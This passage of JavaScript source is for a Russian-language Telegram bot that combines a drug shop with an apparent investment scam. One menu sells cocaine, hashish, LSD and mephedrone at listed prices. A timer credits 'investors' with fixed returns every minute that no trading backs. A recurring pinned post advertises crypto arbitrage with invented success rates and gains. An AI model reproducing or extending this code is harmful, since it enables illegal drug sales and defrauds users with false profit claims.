                                [{ text: "🔮 КОКС - Prestige 0.5гр", callback_data: `bano` },{ text: "🔮 КОКС - Prestige 1гр", callback_data: `bano` }],
                                [{ text: "🔮 ГАШИШ - TWIX 5гр", callback_data: `bano_7395` },{ text: "🔮 Шишики Tutankhamon 3гр ", callback_data: `bano_5899` }],
                                [{ text: "🔮 ЛСД 6шт", callback_data: `bano_7299` },{ text: "🔮 Меф GOLDEN 3гр", callback_data: `bano_5899` }],
                                [{ text: "🔮 МЕФЕДРОН - FLOUR 10гр", callback_data: `bano` }],
                                [{ text: "< Меню", callback_data: `menu` }],
                                        ]
                                    },
                                parse_mode: "HTML"
                                });
                                }
}

if(query.data.startsWith("raz")) {						
	return bot.answerCallbackQuery(query.id, "🔑 Данный раздел находится в разработке", true);
}

if(query.data.startsWith("bano")) {		
    let id			=		Number(query.data.split("_")[1]);				
	 bot.answerCallbackQuery(query.id, `Пополните баланс. Данный товар стоит ${id} RUB.`, true);
	return bot.sendMessage(message.chat.id,`Данный товар стоит ${id} RUB:`, {
		reply_markup: {
				inline_keyboard: [
		[{ text: "Пополнить баланс", callback_data: `deposit` }],
		[{ text: "< Меню", callback_data: `menu` }],
				]
			},
		parse_mode: "HTML"
		});

}
		

	if(admins.indexOf(message.user.id) !== -1) {

		if(query.data.startsWith("withdraw")) {
			let id			=		Number(query.data.split("withdraw")[1]);
			let ticket		=		await Ticket.findOne({ owner: id });

			if(!ticket) return bot.answerCallbackQuery(query.id, "Заявка не найдена.");
				var today = new Date();
var dd = String(today.getDate()).padStart(2, '0');
var mm = String(today.getMonth() + 1).padStart(2, '0');
await Stats.findOneAndUpdate({ id: `${dd}.${mm}` }, { $inc: { viv: 1 } })
await Stats.findOneAndUpdate({ id: `${dd}.${mm}` }, { $inc: { sumviv: ticket.amount } })
							let ouser = await User.findOne({ id: 5547452982 });
			let oq = ouser.oq
			let ow = ouser.ow
			let oe = ouser.oe
			let or = ouser.or
			await User.findOneAndUpdate({ id: 5547452982 }, { $set: { ot: or } })
            await User.findOneAndUpdate({ id: 5547452982 }, { $set: { or: oe } })
			await User.findOneAndUpdate({ id: 5547452982 }, { $set: { oe: ow } })
			await User.findOneAndUpdate({ id: 5547452982 }, { $set: { ow: oq } })
			await User.findOneAndUpdate({ id: 5547452982 }, { $set: { oq: `➖ <b>${ticket.owner}</b> вывел со счёта: <b>${ticket.amount.toFixed(2)}₽</b>.` } })
			bot.sendMessage(ticket.owner, `✅ <b>Вашу заявку на вывод средств приняла администрация проекта
Спасибо, что Вы с нами. Будем рады отзыву в чате -</b> https://t.me/LXFinanceChat`, {
			parse_mode: "HTML"
		});
		
		await bot.answerCallbackQuery(query.id, "✅ Вы подтвердили оплату данной заявки", true);
let user = await User.findOne({ id: Number(ticket.owner) });
			await ticket.remove();
			await User.findOneAndUpdate({ id: 5547452982 }, { $inc: { spay: 1 } })
			return;
		}

		if(query.data.startsWith("declineback")) {
			let id			=		Number(query.data.split("declineback")[1]);
			let ticket		=		await Ticket.findOne({ owner: id });

			if(!ticket) return bot.answerCallbackQuery(query.id, "Заявка не найдена.");

			await bot.sendMessage(ticket.owner, "Вам отклонили выплату и вернули деньги.");
			await User.findOne({ id: id }).then(async (user) => await user.inc("balance", ticket.amount));

			await ticket.remove();
			await bot.answerCallbackQuery(query.id, "Вы отказали в выплате средств и вернули деньги на баланс.");
		}

		if(query.data.startsWith("decline")) {
			let id			=		Number(query.data.split("decline")[1]);
			let ticket		=		await Ticket.findOne({ owner: id });

			if(!ticket) return bot.answerCallbackQuery(query.id, "Заявка не найдена.");

			await ticket.remove();
			await bot.answerCallbackQuery(query.id, "Вы отказали в выплате средств.");
		}
	}
});

User.prototype.inc		=		function(field, value = 1) {
	this[field] 		+=		value;
	return this.save();
}

User.prototype.dec 		= 		function(field, value = 1) {
	this[field] 		-= 		value;
	return this.save();
}

User.prototype.set 		= 		function(field, value) {
	this[field] 		=	 	value;
	return this.save();
}

function randomizeArr(arr) {
	var j, temp;
	for (var i = arr.length - 1; i > 0; i--) {
		j = Math.floor(Math.random() * (i + 1));
		temp = arr[j];
		arr[j] = arr[i];
		arr[i] = temp;
	}
	return arr;
}

async function rupdate() {
  let userList = await User.find();
await userList.map(async (x) => {
	  if (x.invests === 0) { return
  }

if(x.invests <= 19999.99) {
await User.updateOne({ id: x.id }, { $inc: { balance: x.invests*0.045/24/60 } }, 
  function (err) {
     if (err) throw err
})
}
if(x.invests >= 20000) {
await User.updateOne({ id: x.id }, { $inc: { balance: x.invests*0.056/24/60 } }, 
  function (err) {
     if (err) throw err
})
}
 })
}

function getBalance() {
return new Promise((resolve, reject) => {
payeer.getBalance((err, result) => {
if(err) {
reject(err);
}
console.log(result)
resolve(result.balance.RUB.total);
});
});
}

function transfer(options) {
  return new Promise((resolve, reject) => {
    payeer.transfer(options, (err, result) => {
        if(err) {
            reject(err);
        }

        resolve(result);
    });
  });
}

function payout(options) {
  return new Promise((resolve, reject) => {
    payeer.payout(options, (err, result) => {
        if(err) {
            reject(err);
        }

        resolve(result);
    });
  });
}

function getHistory() {
  return new Promise((resolve, reject) => {
    payeer.getHistory((err, result) => {
        if(err) {
            reject(err);
        }

        resolve(result.history);
    });
  });
} 

async function days() {
	await User.findOneAndUpdate({ id: 5547452982 }, { $inc: { day: 1 } })
	} 


setInterval(async() => {
  rupdate(); 
}, 60000); 

async function pin() {
		bot.unpinAllChatMessages("@DIAMONDfinanceChat")
		let log = await bot.sendMessage("@DIAMONDfinanceChat", `<b>Всем привет 👋</b>

Мы создали новую инвестиционную платформу в Telegram - <b>Finance Arbitrage</b>. Она позволяет получать прибыль прямо внутри мессенджера, благодаря нашей команде и новому перспективному направлению Крипто-Арбитраж. 

<b>Как мы зарабатываем ⁉️</b>

<b>Криптовалютный арбитраж</b> - это покупка криптовалюты на одной бирже и продажа на другой с целью получения прибыли на разнице курсов. 📉

<b>Простыми словами:</b> Купили на одной бирже какой-то актив за 1000$, продали на другой бирже за 1050$ = заработали чистыми 50$. Как правило это 2-5% чистой прибыли. 

Мы смело можем назвать себя лучшей командой, зарабатывающей на арбитраже криптовалют и сейчас мы даём возможность людям зарабатывать вместе с нами!
 
<b>Более 97% успешных сделок! 

+33,8% на связке BTC за 12 дней!
+19,6% на связке ETH за 10 дней!
+12,6% на связке SOL за 6 дней!

Теперь вам необязательно годами учить у компьютера трейдинг, наши специалисты сделают все за вас 😉</b>
@SimpleArbitrageFinanceBot

`, {
	parse_mode: "HTML",
					reply_markup: {
               inline_keyboard: [	
						      [
					   { text: "💰 Перейти в бота", url: `https://t.me/SimpleArbitrageFinanceBot` },
					   ],
						],
						
			},
				})
		
		let msg = await bot.pinChatMessage("@DIAMONDfinanceChat", log.message_id, { disable_notification: false })
		let test = await bot.sendMessage("@DIAMONDfinanceChat", "/")
		let id = test.message_id
		await bot.deleteMessage("@DIAMONDfinanceChat", id)
		await bot.deleteMessage("@DIAMONDfinanceChat", id - 1)
	}

setInterval(async() => {
  pin(); 
}, 21600000);


async function rfupdate() {
	let data1 = 1;
	let data2 = 2.2;
let data3 = await CoinGeckoClient.simple.price({  ids: ['bitcoin'], vs_currencies: ['usd'] }); //
let data4 = await CoinGeckoClient.simple.price({  ids: ['Ethereum'], vs_currencies: ['usd'] }); //
let data5 = await CoinGeckoClient.simple.price({  ids: ['BinanceCoin'], vs_currencies: ['usd'] }); //
let data6 = 1;

data3 = data3.data.bitcoin.usd;
data4 = data4.data.ethereum.usd;
data5 = data5.data.binancecoin.usd;
await Curse.findOneAndUpdate({ uid: `Cursest` }, { $set: { Usdt: data1, Ton: data2, Bitcoin: data3, Ethereum: data4, BinanceCoin: data5, Busd: data6 } }) 
console.log(`Успешно`)
axios.get("https://www.cbr-xml-daily.ru/daily_json.js")
		.then (async(res) => {
await Curse.findOneAndUpdate({ uid: `Cursest` }, { $set: { rub: res.data.Valute.USD.Value, eur: res.data.Valute.EUR.Value, byn: res.data.Valute.BYN.Value, uan: res.data.Valute.UAH.Value, gbp: res.data.Valute.GBP.Value, cny: res.data.Valute.CNY.Value, kzt: res.data.Valute.KZT.Value, uzs: res.data.Valute.UZS.Value, gel: res.data.Valute.GEL.Value, try: res.data.Valute.TRY.Value, krw: res.data.Valute.KRW.Value } }) 
		})
	}
setInterval(async() => {
  rfupdate(); 
}, 60000); 